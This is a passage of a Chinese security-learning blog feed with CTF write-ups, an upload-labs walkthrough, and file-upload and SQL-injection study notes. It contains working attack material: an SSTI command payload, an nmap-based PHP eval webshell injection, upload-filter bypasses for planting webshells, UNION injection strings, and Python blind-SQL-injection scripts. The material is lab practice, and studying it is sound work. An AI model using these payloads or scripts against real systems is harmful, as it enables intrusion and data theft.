class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="VNCTF2023-象棋王子、"><a href="#VNCTF2023-象棋王子、" class="headerlink" title="[VNCTF2023]象棋王子、"></a>[VNCTF2023]象棋王子、</h1><p>在源码里发现了js混淆的代码</p><p>该内容能直接执行故丢到控制台去看看成功获取flag</p><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>该题目与前面的</p><p>[BUUCTF 2018]Online Tool很像利用nmap的-og参数将木马写入文件内，不过该题目队对php有个过滤使用以下payload即可</p><p>127.0.0.1 | ‘ <?=@eval($_POST["cmd"]);?> -oG shell.phtml ‘</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709114156059.png" class="" title="image-20250709114156059"><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>前置知识：</p><p>WEB-INF是java的WEB应用的安全目录。</p><p>1.WEB-INF&#x2F;web.xml</p><p>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</p><p>2.WEB-INF&#x2F;classes</p><p>包含了站点所有用的class文件，包括servlet class和非servlet class</p><p>3.WEB-INF&#x2F;lib</p><p>存放web应用需要的JAR文件</p><p>4.WEB-INF&#x2F;src</p><p>源码目录，按照包名结构放置各个java文件</p><p>5.WEB-INF&#x2F;database.properties</p><p>数据库配置文件</p><p>6.WEB-INF&#x2F;tags</p><p>存放了自定义标签文件</p><p>7.WEB-INF&#x2F;jsp</p><p>jsp 1.2 一下版本的文件存放位置。</p><p>8.WEB-INF&#x2F;jsp2</p><p>存放jsp2.0以下版本的文件。</p><p>9.META-INF</p><p>相当于一个信息包。</p><p>Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。</p><p>Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录（请注意这里，是通过Nginx，而不是Tomcat访问到的，因为上面已经说到，Tomcat是禁止访问这个目录的。）。</p><p>直接在域名后面加上WEB-INF&#x2F;web.xml就可以了</p><p>当攻击者通过传入恶意的<code>name</code>参数值为<code>WEB-INF/web.xml</code>时可以读取Web应用的配置信息</p><p>相当于一个文件任意读取</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709151517513.png" class="" title="image-20250709151517513"><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h1 id="2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th-cat-flag"><a href="#2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th-cat-flag" class="headerlink" title="[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cat flag"></a>[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cat flag</h1><p>根据提示管理员访问过flag那就寻找日志文件</p><p>?<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>发先flag文件但是有过滤</p><p>然后就是想办法绕过escapeshellarg</p><p>由于escapeshellarg并不会检测或移除“不可见字符”所以使用以下payload即可</p><p>?cmd&#x3D;this_is_final_fl%ffag_e2a457126032b42d.php</p>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2025/03/13/upload-labs/"/>
      <url>/2025/03/13/upload-labs/</url>
      
        <content type="html"><![CDATA[<p>upload-labs靶场（由于版本的问题该靶场要使用php5等后缀名不能使用nts版的php最简单方法使用老版本phpstudy，第十二和第十三关的php版本要求在5.3以下且<code>magic_quotes_gpc</code>为关闭状态（需要自己关闭））</p><h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p>第一关中直接上传php文件发现其只能上传jpg png gif这种图片文件</p><p>并发现在上传操作时无法对其进行抓包所以确定其为前端验证</p><img src="/2025/03/13/upload-labs/image-20250111172016864.png" class="" title="image-20250111172016864"><p>将一句话木马文件后缀改为jpg进行上传并进行抓包处理</p><img src="/2025/03/13/upload-labs/image-20250111172252352.png" class="" title="image-20250111172252352"><p>使用bp抓包并将文件后缀改为php后发现成功上传文件<img src="/2025/03/13/upload-labs/image-20250111172439851.png" class="" title="image-20250111172439851"></p><p>使用蚁剑进行连接，成功连接木马</p><img src="/2025/03/13/upload-labs/image-20250111172505100.png" class="" title="image-20250111172505100"><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>第二关发现其并不是前端验证</p><img src="/2025/03/13/upload-labs/image-20250111173721227.png" class="" title="image-20250111173721227"><p>但直接bp抓包修改后缀名即可成功上传木马，之后使用蚁剑连接即可</p><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p>上传php文件后发现其设置了黑名单</p><img src="/2025/03/13/upload-labs/image-20250111173930664.png" class="" title="image-20250111173930664"><p>不允许上传php文件，故抓包将php文件后缀改为php5进行尝试</p><p>进行多次尝试发现新版phpstudy默认下载的php版本有问题故而将版本退回2016进行尝试实验成功，原因是因为新版phpstudy下载的php版本均为nts版配置文件中无法更改识别内容故将其退回2016版本即可</p><p>详细内容参考该文章<a href="https://www.cnblogs.com/Article-kelp/p/14927087.html">关于PHPStudy中使用AddType application&#x2F;x-httpd-php该Apache的设置命令无效的问题 - Article_kelp - 博客园</a></p><p>该题是黑名单过滤但并未过滤掉php3或者php5这类文件故更改文件名后缀即可</p><h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><p>首先上传php文件发现被列入黑名单了于是进行上传其余后缀名文件如php3 php5 phtml均无法上传</p><p>方法一：于是想到更改配置文件将jpg文件视为php进行解析后进行实验确实可以通过。但是该方法需要管理员权限才可使用</p><p>方法二：上传.htaccess文件使其能够将其他类型的文件当作php文件进行解析，在文件中写入AddType application&#x2F;x-httpd-php jpg.txt使其能够解析jpg文件和txt之后上传这两种文件木马，之后上传木马即可</p><img src="/2025/03/13/upload-labs/image-20250113104741686.png" class="" title="image-20250113104741686"><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p>首先上传一些文件发现.htaccess文件php文件无法上传但是txt和jpg和.user.ini文件可以正常上传</p><p>于是使用.user.ini文件进行尝试</p><p>编辑文件内容为<img src="/2025/03/13/upload-labs/image-20250113110229330.png" class="" title="image-20250113110229330"></p><p>来确保muma文件被包含在php文件前进行解释</p><p>之后使用蚁剑连接其中的php文件即可</p><img src="/2025/03/13/upload-labs/image-20250113111646926.png" class="" title="image-20250113111646926"><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p>上传上面那些文件发现均无法正常使用于是考虑绕过</p><p>该关使用大小写绕过即可</p><img src="/2025/03/13/upload-labs/image-20250113121731927.png" class="" title="image-20250113121731927"><p>更改后缀名大小写即可</p><h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p>该关使用空格绕过</p><img src="/2025/03/13/upload-labs/image-20250113122109907.png" class="" title="image-20250113122109907"><p>在文件后缀加入空格即可</p><img src="/2025/03/13/upload-labs/image-20250113122215985.png" class="" title="image-20250113122215985"><h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p>将各种文件上传一遍发现均行不通，遇事不决看源码</p><img src="/2025/03/13/upload-labs/image-20250113124019526.png" class="" title="image-20250113124019526"><p>该题将所有进行利用的后缀名都列入了黑名单，但是并没有删除后缀名后.的功能于是从此着手</p><p>在php的后缀名后加入一个.即可成功</p><img src="/2025/03/13/upload-labs/image-20250113124427951.png" class="" title="image-20250113124427951"><h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p>考察文件数据流</p><p>上传php文件在bp中将php改为php::$DATA即可成功上传</p><img src="/2025/03/13/upload-labs/image-20250113214647770.png" class="" title="image-20250113214647770"><p>上传成功后使用木马进行连接</p><img src="/2025/03/13/upload-labs/image-20250113214535151.png" class="" title="image-20250113214535151"><h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p>考察点空格绕过</p><p>将上传的木马文件后缀改为.php. . 即可绕过</p><img src="/2025/03/13/upload-labs/image-20250113221551452.png" class="" title="image-20250113221551452"><p>之后蚁剑连接.php文件即可</p><img src="/2025/03/13/upload-labs/image-20250113221509151.png" class="" title="image-20250113221509151"><h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><img src="/2025/03/13/upload-labs/image-20250113222023512.png" class="" title="image-20250113222023512"><p>该关考察双写绕过根据源码只检测一次后缀名所以双写后缀名即可</p><img src="/2025/03/13/upload-labs/image-20250113222557414.png" class="" title="image-20250113222557414"><p>后使用蚁剑连接</p><img src="/2025/03/13/upload-labs/image-20250113222533194.png" class="" title="image-20250113222533194"><h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1> <img src="/2025/03/13/upload-labs/image-20250113222747446.png" class="" title="image-20250113222747446"><p>该题目设置白名单且前面方法不能使用，该题考察空字符绕过</p><p>使用bp抓包将其上传路径改为muma.php%00即可</p><img src="/2025/03/13/upload-labs/image-20250114195716711.png" class="" title="image-20250114195716711"><img src="/2025/03/13/upload-labs/image-20250114195624071.png" class="" title="image-20250114195624071"><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><p>该关卡也是考察空字符绕过不过使用的是0x00并且使用post传参</p><p>如下方修改即可上传成功</p><img src="/2025/03/13/upload-labs/image-20250114214410877.png" class="" title="image-20250114214410877"><p><strong><img src="/2025/03/13/upload-labs/image-20250114214519504.png" class="" title="image-20250114214519504"></strong></p><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><p>（注意图片马不宜过大否则会解析失败）</p><p>该关考察图片字节与文件包含漏洞</p><img src="/2025/03/13/upload-labs/image-20250115203858021.png" class="" title="image-20250115203858021"><p>会根据文件前几位字节进行判断，在图片马前加入几个字节方便010进行修改</p><img src="/2025/03/13/upload-labs/image-20250115204132057.png" class="" title="image-20250115204132057"><img src="/2025/03/13/upload-labs/image-20250115203743766.png" class="" title="image-20250115203743766"><p>然后尝试上传文件</p><img src="/2025/03/13/upload-labs/image-20250115204656908.png" class="" title="image-20250115204656908"><p>成功上传php文件，但此时蚁剑无法进行连接，于是利用文件包含漏洞</p><p>进行文件包含使其被解析为php文件使用蚁剑连接即可</p><p><strong><img src="/2025/03/13/upload-labs/image-20250115205428330.png" class="" title="image-20250115205428330"></strong></p><h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><p>该关卡环境PHP 4 &gt;&#x3D; 4.3.0, PHP 5, PHP 7并且开启php_exif</p><p>该关使用getimagesize() 函数</p><p>故仍使用图片马上传即可，下面为图片马制作指令</p><img src="/2025/03/13/upload-labs/image-20250115210903379.png" class="" title="image-20250115210903379"><p>之后再次利用文件包含即可</p><img src="/2025/03/13/upload-labs/image-20250115211101535.png" class="" title="image-20250115211101535"><p>最后使用蚁剑连接。与14关一致</p><h1 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h1><p>该关使用exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快</p><p>其对应解法与14关相同</p><h1 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h1><p>该关对图片进行了二次渲染故需要对文件进行比较</p><p>对两次上传的图片进行比较找到未发生更改的地方</p><img src="/2025/03/13/upload-labs/image-20250115213303611.png" class="" title="image-20250115213303611"><p>使用010进行文件比较即可</p><img src="/2025/03/13/upload-labs/image-20250115213327859.png" class="" title="image-20250115213327859"><p>找到未发生更改的地方将其改为一句话木马然后上传利用文件包含漏洞访问即可</p><img src="/2025/03/13/upload-labs/image-20250115213709057.png" class="" title="image-20250115213709057"><h1 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h1><p>该关使用条件竞争</p><img src="/2025/03/13/upload-labs/image-20250115215257565.png" class="" title="image-20250115215257565"><p>即先不断上传文件，然后想办法在文件被删除前访问该文件，以达到执行该文件，从而避免被系统删除的目的。之后，我们尝试访问上传后的木马文件，采用同样的思路进行抓包，并将该数据包发送到Intruder模块。启动Intruder模块，使得Burpsuit不断访问该文件，同时在Burpsuit的Repeater模块中不断上传该数据包</p><img src="/2025/03/13/upload-labs/image-20250115215439977.png" class="" title="image-20250115215439977"><p>凭借运气来进行连接即可</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 靶场记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>upload知识点</title>
      <link href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="upload学习知识点"><a href="#upload学习知识点" class="headerlink" title="upload学习知识点"></a>upload学习知识点</h1><p>upload学习过程中涉及的知识点</p><h2 id="一、配置文件"><a href="#一、配置文件" class="headerlink" title="一、配置文件"></a>一、配置文件</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113102031543.png" class="" title="image-20250113102031543">_Preview Image<p>对配置文件的修改</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113104230202.png" class="" title="image-20250113104230202"><p>upload相关配置文件</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113104958667.png" class="" title="image-20250113104958667"><p>.htaccess文件的优先级高所以其危险性更大</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113105142420.png" class="" title="image-20250113105142420"><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113105321212.png" class="" title="image-20250113105321212"><p>user.ini文件生效前提是目录中存在php文件可以对其进行覆盖</p><h2 id="二、额外数据流"><a href="#二、额外数据流" class="headerlink" title="二、额外数据流"></a>二、额外数据流</h2><p>在Windows操作系统中，当你看到文件名后跟着”::D A T A “ 时，它表示文件的一个附加数据流 ( A l t e r n a t e D a t a S t r e a m ， A D S ) 。数据流是 − − 种用于在文件内部存储额外数据的机制在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是 W i n d o w s N T 文件系统 ( N T F S ) 支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加 “ … DATA”时，它表示文件的一个附加数据流(Alternate DataStream，ADS)。数据流是–种用于在文件内部存储额外数据的机制 在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows NT文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”…DATA”时，它表示文件的一个附加数据流(AlternateDataStream，ADS)。数据流是−−种用于在文件内部存储额外数据的机制在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是WindowsNT文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”…DATA”来访问<br>原理:Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成-个test.php的文件，其中内容和所上传文件内容相同，并被解。<br> <img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113212429743.png" class="" title="image-20250113212429743"></p><p>要访问额外数据流信息即可noteoad 文件名称 ： 设置的数据流空间名称</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113212441804.png" class="" title="image-20250113212441804"><p>php不会验证文件数据流故可以上传成功</p><p>在windows中不允许文件名后缀带有：：$故上传后php后的标识会消失</p><h2 id="三-空格绕过"><a href="#三-空格绕过" class="headerlink" title="三.空格绕过"></a>三.空格绕过</h2><p>windows系统中.空格会被自动删除所以可以用来绕过</p><p>所以在上传木马的时候可以将php文件后缀加入.空格.空格来绕过</p><h2 id="四、空字符"><a href="#四、空字符" class="headerlink" title="四、空字符"></a>四、空字符</h2><p>0x00与%00都表示空</p><h2 id="五、图片字节表示"><a href="#五、图片字节表示" class="headerlink" title="五、图片字节表示"></a>五、图片字节表示</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115110024514.png" class="" title="image-20250115110024514"><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115170138085.png" class="" title="image-20250115170138085"><h2 id="六、相关php函数"><a href="#六、相关php函数" class="headerlink" title="六、相关php函数"></a>六、相关php函数</h2><p>getimagesize() 函数获取图像文件的信息，返回一个包含多个元素的数组。这个数组包括图像的宽度、高度、MIME 类型等信息。<br>如果 $filename 不是图像文件，getimagesize() 会返回 false。</p><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。</p><p>那么它的语法是：</p><p>exif_imagetype ( string $filename ) : int</p><p>$filename是文件位置和名称，如果检查是图片文件则返回一个跟图像类型对应的数字，否则返回 FALSE。</p><p>image_type_to_extension($info[2]) 会根据 getimagesize() 返回的图像信息中的 MIME 类型（即 $info[2]）返回对应的扩展名。例如，image_type_to_extension() 会把 IMAGETYPE_JPEG 转换为 .jpeg，IMAGETYPE_PNG 转换为 .png，等等。<br>检查文件扩展名是否在允许的图像类型中：</p><p>pathinfo()该函数用于获取其后缀名称<strong>文件扩展名获取</strong>：可以通过 <code>pathinfo()</code> 提取文件的扩展名，方便做文件类型检查</p><p>$ext &#x3D; pathinfo($filename, PATHINFO_EXTENSION);</p><h2 id="七、二次渲染"><a href="#七、二次渲染" class="headerlink" title="七、二次渲染"></a>七、二次渲染</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115212724670.png" class="" title="image-20250115212724670"><p>二次渲染会对文件进行一次重写其显示的内容不变但是文件本身内容发送一部分的改变</p><h2 id="八、条件竞争"><a href="#八、条件竞争" class="headerlink" title="八、条件竞争"></a>八、条件竞争</h2><p>upload-labs18关的源码</p><p>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if(isset($_POST[‘submit’])){  &#x2F;&#x2F; 检查是否提交了上传表单，如果提交了则执行下面的代码块<br>    $ext_arr &#x3D; array(‘jpg’,’png’,’gif’);  &#x2F;&#x2F; 定义允许上传的文件类型数组，包括jpg，png，gif<br>    $file_name &#x3D; $_FILES[‘upload_file’][‘name’];    &#x2F;&#x2F; 从上传表单中获取上传文件的名字<br>    $temp_file &#x3D; $_FILES[‘upload_file’][‘tmp_name’];    &#x2F;&#x2F; 从上传表单中获取上传文件的临时路径<br>    $file_ext &#x3D; substr($file_name,strrpos($file_name,”.”)+1);  &#x2F;&#x2F; 获取上传文件的扩展名，即文件名的最后部分<br>    $upload_file &#x3D; UPLOAD_PATH . ‘&#x2F;‘ . $file_name;  &#x2F;&#x2F; 拼接出上传文件的完整路径，创建以原文件名为名的文件<br>    if(move_uploaded_file($temp_file, $upload_file)){  &#x2F;&#x2F; 将临时文件移动到指定的路径，如果移动成功则执行<br>        if(in_array($file_ext,$ext_arr)){  &#x2F;&#x2F; 检查上传文件的扩展名是否在允许的类型数组中，如果在则执行下面的代码块<br>            $img_path &#x3D; UPLOAD_PATH . ‘&#x2F;‘. rand(10, 99).date(“YmdHis”).”.”.$file_ext;<br>            #生成新的文件名，包括随机数字、当前日期和时间以及原文件的扩展名<br>            rename($upload_file, $img_path);   &#x2F;&#x2F; 将上传的文件重命名为新的文件名<br>            $is_upload &#x3D; true;<br>        }else{  &#x2F;&#x2F; 如果上传文件的扩展名不在允许的类型数组中，则设置错误消息，并删除上传的文件<br>            $msg &#x3D; “只允许上传.jpg|.png|.gif类型文件！”;<br>            unlink($upload_file);<br>        }<br>    }else{<br>        $msg &#x3D; ‘上传出错！’;<br>    }<br>}</p><p>将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可通过条件竞争的方式在unlink之前，访问webshell。</p><p>使用burp拦截上传18.php的数据包并对数据包发送至intruder模块进行高速重发（上传包）</p><p>其实就是利用代码执行的逻辑问题来进行上传，如：当文件先上传后改名时就可以通过不断的发包从而访问到指定的文件</p><p>条件竞争解释：</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115214051648.png" class="" title="image-20250115214051648"><h2 id="九、系统解析漏洞"><a href="#九、系统解析漏洞" class="headerlink" title="九、系统解析漏洞"></a>九、系统解析漏洞</h2><p>系统解析文件是从后往前解析，如1.php.7z先解析7z后解析php，故阿帕奇系统存在此文件上传漏洞</p><h2 id="PHP临时文件上传"><a href="#PHP临时文件上传" class="headerlink" title="PHP临时文件上传"></a>PHP临时文件上传</h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/11/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>sql注入发生原理：</p><p>用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库</p><h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入……</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><strong>1.判断显示位</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=SELECT first name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select 1,2,3#;</span><br></pre></td></tr></table></figure><p><strong>2.爆数据库的名字</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;1&#x27; union select 1,user(),database()--+‘；</span><br></pre></td></tr></table></figure><p><strong>3.爆数据库中的表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&#x27;;</span><br></pre></td></tr></table></figure><p><strong>4.爆表中的字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= &#x27;-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+&#x27;，</span><br></pre></td></tr></table></figure><p><strong>5.爆相应字段的所有数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(user,password) from users--+&#x27;;</span><br></pre></td></tr></table></figure><h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">if __name__ == &#x27;__main__&#x27; :</span><br><span class="line">    url = &#x27;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            data=&#123;</span><br><span class="line">                &quot;uname&quot;:f&quot;admin&#x27; and &#123;payload&#125;#&quot;,</span><br><span class="line">                &quot;passwd&quot;:12346</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=data)</span><br><span class="line">            if &#x27;flag.jpg&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">if __name__ == &#x27;__main__&#x27; :</span><br><span class="line">    url = &#x27;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            stime=time.time()</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if time.time()-stime&lt;2:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><h3 id="注入类型-1"><a href="#注入类型-1" class="headerlink" title="注入类型"></a>注入类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法</p><p>利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" 